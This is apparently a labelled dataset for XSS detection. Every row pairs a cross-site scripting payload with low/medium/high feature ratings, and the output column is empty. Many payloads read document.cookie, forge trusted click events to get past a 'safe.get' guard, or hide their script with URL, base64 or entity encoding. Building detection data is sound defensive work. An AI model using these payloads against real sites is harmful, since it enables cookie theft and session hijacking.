attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
<script>(function() {var event = document.createevent(%22mouseevents%22);event.initmouseevent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakedata = [event, {istrusted: true}, event];arguments.__definegetter__('0', function() { return fakedata.pop(); });alert(safe.get.apply(null, arguments));})();</script>	L	M	H	L	L	H	L	L	
<script>var script = document.getelementsbytagname('script')[0]; var clone = script.childnodes[0].clonenode(true); var ta = document.createelement('textarea'); ta.appendchild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>	L	M	M	L	L	M	M	L	
<script>xhr=new activexobject(%22msxml2.xmlhttp%22);xhr.open(%22get%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readystate==4%26%26xhr.status==200){alert(xhr.responsetext.match(/'([^']%2b)/)[1])}};xhr.send();</script>	L	L	M	L	L	H	L	L	
<script>alert(document.documentelement.innerhtml.match(/'([^']%2b)/)[1])</script>	M	L	M	L	M	M	L	M	
<script>alert(document.getelementsbytagname('html')[0].innerhtml.match(/'([^']%2b)/)[1])</script>	H	L	M	L	M	M	L	M	
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>	L	L	L	L	M	L	M	L	
<script> var xdr = new activexobject(%22microsoft.xmlhttp%22);  xdr.open(%22get%22, %22/xssme2%3fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responsetext.match(/document.cookie = '(.*%3f)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>	L	M	M	L	L	H	L	L	
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getelementbyid('ifra'); ifr.contentdocument.write(%22<scr%22 %2b %22ipt>top.foo = object.defineproperty</scr%22 %2b %22ipt>%22); foo(window, 'safe', {value:{}}); foo(safe, 'get', {value:function() {    return document.cookie }}); alert(safe.get());</script>	L	L	H	L	L	H	L	L	
<script>alert(document.head.innerhtml.substr(146,20));</script>	M	L	M	L	M	L	L	M	
<script>alert(document.head.childnodes[3].text)</script>	M	L	M	L	M	L	L	M	
<script>var request = new xmlhttprequest();request.open('get', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responsetext.substr(150,41));}</script>	L	M	M	L	H	L	M	L	
<script>object.defineproperty(window, 'safe', {value:{}});object.defineproperty(safe, 'get', {value:function() {return document.cookie}});alert(safe.get())</script>	H	L	M	L	H	L	M	H	
<script>x=document.createelement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%22)};document.body.appendchild(x);</script>	L	L	H	L	L	M	L	L	
<script>x=document.createelement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>object.defineproperty(parent,'safe',{value:{}});object.defineproperty(parent.safe,'get',{value:function(){return top.document.cookie}});alert(parent.safe.get())<\/script>%22)};document.body.appendchild(x);</script>	L	L	H	L	L	M	L	L	
<script> var+xmlhttp+=+null; try+{ xmlhttp+=+new+xmlhttprequest(); }+catch(e)+{} if+(xmlhttp)+{ xmlhttp.open('get',+'/xssme2',+true); xmlhttp.onreadystatechange+=+function+()+{ if+(xmlhttp.readystate+==+4)+{ xmlhttp.responsetext.match(/document.cookie%5cs%2b=%5cs%2b'(.*)'/gi); alert(regexp.%241); } } xmlhttp.send(null); }; </script>	L	M	M	L	L	M	M	L	
<script> document.getelementbyid(%22safe123%22).click=function()+{alert(safe.get());} document.getelementbyid(%22safe123%22).click({'type':'click','istrusted':true}); </script>	L	L	M	L	H	M	M	H	
<script> var+mouseevent=function+mouseevent(){}; mouseevent=mouseevent var+test=new+mouseevent(); test.istrusted=true; test.type='click';  document.getelementbyid(%22safe123%22).click=function()+{alert(safe.get());} document.getelementbyid(%22safe123%22).click(test); </script>	L	M	M	L	L	M	M	L	
<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('user cookie is ' %2b x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__definegetter__('istrusted', function () { return true; });    exploit(safe.get());   };      var e = document.createevent('mouseevent');   e.initevent('click', true, true);   o.dispatchevent(e);  })(document.getelementbyid('safe123')); </script>	L	M	H	L	L	M	L	L	
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253dnew%2520this.contentwindow.window.xmlhttprequest%2528%2529%253bfff.open%2528%2522get%2522%252c%2522xssme2%2522%2529%253bfff.onreadystatechange%253dfunction%2528%2529%257bif%2520%2528fff.readystate%253d%253d4%2520%2526%2526%2520fff.status%253d%253d200%2529%257balert%2528fff.responsetext%2529%253b%257d%257d%253bfff.send%2528%2529%253b></iframe>	L	L	M	L	H	L	M	L	
<script>     function b() { return safe.get(); } alert(b({type:string.fromcharcode(99,108,105,99,107),istrusted:true})); </script> 	M	L	M	L	H	L	M	H	
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerdocument.cookie) width=0 height= 0 /> #	M	L	M	L	M	M	M	M	
<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__definegetter__(text[0], function () { return true })    alert(safe.get());   };      var event = doc.createevent(text[1]);   event.initevent(text[2], true, true);   elem.dispatchevent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerdocument,this.name.split(/,/)) name=istrusted,mouseevent,click width=0 height=0 /> # 	L	L	H	L	L	M	L	L	
<script+for=document+event=onreadystatechange>mouseevent=function+mouseevent(){};test=new+mouseevent();test.istrusted=true;test.type=%22click%22;getelementbyid(%22safe123%22).click=function()+{alert(safe.get());};getelementbyid(%22safe123%22).click(test);</script>#	L	L	M	L	L	M	L	L	
<script> var+xmlhttp+=+null; try+{ xmlhttp+=+new+xmlhttprequest(); }+catch(e)+{} if+(xmlhttp)+{ xmlhttp.open('get',+'/xssme2',+true); xmlhttp.onreadystatechange+=+function+()+{ if+(xmlhttp.readystate+==+4)+{ xmlhttp.responsetext.match(/document.cookie%5cs%2b=%5cs%2b'(.*)'/gi); alert(regexp.%241); } } xmlhttp.send(null); }; </script>#	L	M	M	L	L	M	M	L	
<video+onerror='javascript:mouseevent=function+mouseevent(){};test=new+mouseevent();test.istrusted=true;test.type=%22click%22;document.getelementbyid(%22safe123%22).click=function()+{alert(safe.get());};document.getelementbyid(%22safe123%22).click(test);'><source>%23	L	L	M	L	L	M	L	L	
<script for=document event=onreadystatechange>getelementbyid('safe123').click()</script>	H	L	M	L	M	L	L	M	
<script> var+x+=+showmodelessdialog+(this); alert(x.document.cookie); </script>	M	L	M	L	M	L	M	M	
<script> location.href = 'data:text/html;base64,phnjcmlwdd54pw5ldybytuxidhrwumvxdwvzdcgpo3gub3blbigir0vuiiwiahr0cdovl3hzc21llmh0bww1c2vjlm9yzy94c3ntztiviix0cnvlktt4lm9ubg9hzd1mdw5jdglvbigpihsgywxlcnqoec5yzxnwb25zzvrlehqubwf0y2gol2rvy3vtzw50lmnvb2tpzsa9iccolio/kscvkvsxxsl9o3guc2vuzchudwxskts8l3njcmlwdd4='; </script>	H	L	M	L	M	L	M	L	
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { istrusted: true };var a = [event, o, event];var get;event.__definegetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__definegetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#	L	M	H	L	L	M	L	L	
<iframe onload=%22write('<script>'%2blocation.hash.substr(1)%2b'</script>')%22></iframe>#var xhr = new xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	M	L	L	M	M	L	
<textarea id=ta></textarea><script>ta.appendchild(safe123.parentnode.previoussibling.previoussibling.childnodes[3].firstchild.clonenode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>	L	L	M	L	H	M	M	L	
<textarea id=ta onfocus=console.dir(event.currenttarget.ownerdocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253d%2520new%2520xmlhttprequest()%253bxhr.open('get'%252c%2520'http%253a%252f%252fhtml5sec.org%252fxssme2'%252c%2520true)%253bxhr.onload%2520%253d%2520function()%2520%257b%2520alert(xhr.responsetext.match(%252fcookie%2520%253d%2520'(.*%253f)'%252f)%255b1%255d)%2520%257d%253bxhr.send()%253b%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>	L	L	H	L	L	L	M	L	
<iframe onload=%22write('<script>'%2blocation.hash.substr(1)%2b'</script>')%22></iframe>#var xhr = new xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	M	L	L	M	M	L	
<textarea id=ta></textarea><script>ta.appendchild(safe123.parentnode.previoussibling.previoussibling.childnodes[3].firstchild.clonenode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>	L	L	M	L	H	M	M	L	
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	H	L	L	M	H	L	
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>	L	L	M	L	M	M	M	M	
<object data=%22data:text/html;base64,phnjcmlwdd4gdmfyihhocia9ig5ldybytuxidhrwumvxdwvzdcgpoyb4ahiub3blbignr0vujywgj2h0dha6ly94c3ntzs5odg1snxnlyy5vcmcvehnzbwuyjywgdhj1zsk7ihhoci5vbmxvywqgpsbmdw5jdglvbigpihsgywxlcnqoeghylnjlc3bvbnnlvgv4dc5tyxrjacgvy29va2llid0gjygukj8pjy8pwzfdksb9oyb4ahiuc2vuzcgpoya8l3njcmlwdd4=%22>	M	L	L	L	M	L	L	L	
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	H	L	L	M	H	L	
%3cscript%3exhr=new%20activexobject%28%22msxml2.xmlhttp%22%29;xhr.open%28%22get%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readystate==4%26%26xhr.status==200%29{alert%28xhr.responsetext.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3c/script%3e	L	L	M	L	H	L	L	L	
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new xmlhttprequest();xhr.open('get','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readystate==4%26%26xhr.status==200){alert(xhr.responsetext.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>	L	L	M	L	L	M	M	L	
<a target="x" href="xssme?xss=%3cscript%3eaddeventlistener%28%22domframecontentloaded%22,%20function%28e%29%20{e.stoppropagation%28%29;},%20true%29;%3c/script%3e%3ciframe%20src=%22data:text/html,%253cscript%253eobject.defineproperty%28top,%20%27myevent%27,%20{value:%20object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.safe.get%28%29%29;};event%20=%20new%20object%28%29;event.type%20=%20%27click%27;event.istrusted%20=%20true;y%28event%29;%253c/script%253e%22%3e%3c/iframe%3e	L	L	H	L	H	L	L	L	
<a target="x" href="xssme?xss=<script>var cl=components;var fcc=string.fromcharcode;doc=cl.lookupmethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupmethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,phnjcmlwdd5ldmfskgf0b2iobmftzskppc9zy3jpchq%2b name=zg9jpunvbxbvbmvudhmubg9va3vwtwv0ag9kkhrvcc50b3asj2rvy3vtzw50jykoktt2yxigzmlyzu9uvghpcya9icbkb2muz2v0rwxlbwvudej5swqoj3nhzmuxmjmnktt2yxigzxzpymogpsbkb2n1bwvudc5jcmvhdgvfdmvudcgntw91c2vfdmvudhmnkttldk9iai5pbml0tw91c2vfdmvudcggj2nsawnrjywgdhj1zswgdhj1zswgd2luzg93lcaxlcaxmiwgmzq1lca3lcaymjasigzhbhnllcbmywxzzswgdhj1zswgzmfsc2usidasig51bgwgkttldk9iai5fx2rlzmluzudldhrlcl9fkcdpc1rydxn0zwqnlgz1bmn0aw9ukcl7cmv0dxjuihrydwv9kttmdw5jdglvbib4echjkxtyzxr1cm4gdg9wllnhzmuuz2v0kcl9o2fszxj0khh4kgv2t2jqksk></iframe>	L	M	M	L	H	M	M	L	
<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getselection().getrangeat(0).startcontainer.ownerdocument; console.log(doc); var xpe = new xpathevaluator(); var nsresolver = xpe.creatensresolver(doc); var result = xpe.evaluate('//script/text()', doc, nsresolver, 0, null); alert(result.iteratenext().data.match(/cookie = '(.*?)'/)[1])</script>	L	M	M	L	L	M	L	L	
<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.xmlhttprequest();xhr.open('get', '.', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	H	L	L	M	H	L	
garethy salty method!<script>alert(components.lookupmethod(components.lookupmethod(components.lookupmethod(components.lookupmethod(this,'window')(),'document')(), 'getelementsbytagname')('html')[0],'innerhtml')().match(/d.*'/));</script>	L	L	M	L	L	M	M	L	
<a href="javascript&colon;\u0061&#x6c;&#101%72t&lpar;1&rpar;"><button>	H	L	M	L	M	M	L	M	
<div onmouseover='alert&lpar;1&rpar;'>div</div>	M	L	M	L	M	L	L	M	
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">	H	L	M	L	M	M	L	M	
<a href="javascript&colon;alert&lpar;1&rpar;">x</a>	M	L	M	L	M	L	L	M	
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf"> ?	M	L	L	L	M	M	L	M	
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf">?	M	L	L	L	M	M	L	M	
<var onmouseover="prompt(1)">on mouse over</var>?	M	M	L	L	M	L	M	M	
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>click here</a>	M	L	M	L	M	L	L	M	
<img src="/" =_=" title="onerror='prompt(1)'">	L	L	M	L	M	L	M	M	
<%<!--'%><script>alert(1);</script -->	H	L	L	L	M	L	L	M	
<script src="data:text/javascript,alert(1)"></script>	M	L	M	L	M	L	L	M	
<iframe/src \/\/onload = prompt(1)	L	L	M	L	M	L	M	M	
<iframe/onreadystatechange=alert(1)	L	L	L	L	M	L	L	M	
<svg/onload=alert(1)	L	L	L	L	M	L	L	L	
<input value=<><iframe/src=javascript:confirm(1)	M	L	M	L	M	L	L	M	
<input type="text" value=``<div/onmouseover='alert(1)'>x</div>	L	L	M	L	M	L	L	M	
http://www.<script>alert(1)</script .com	M	L	M	L	M	L	L	M	
<iframe  src=j&newline;&tab;a&newline;&tab;&tab;v&newline;&tab;&tab;&tab;a&newline;&tab;&tab;&tab;&tab;s&newline;&tab;&tab;&tab;&tab;&tab;c&newline;&tab;&tab;&tab;&tab;&tab;&tab;r&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;i&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;p&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;t&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&colon;a&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;l&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;e&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;r&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;t&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;%28&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;1&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;%29></iframe> ?	M	L	M	L	L	M	M	L	
<svg><script ?>alert(1)	M	L	L	L	M	L	L	M	
<iframe  src=j&tab;a&tab;v&tab;a&tab;s&tab;c&tab;r&tab;i&tab;p&tab;t&tab;:a&tab;l&tab;e&tab;r&tab;t&tab;%28&tab;1&tab;%29></iframe>	M	L	M	L	H	M	L	H	
<img src=`xx:xx`onerror=alert(1)>	M	L	L	L	M	L	L	M	
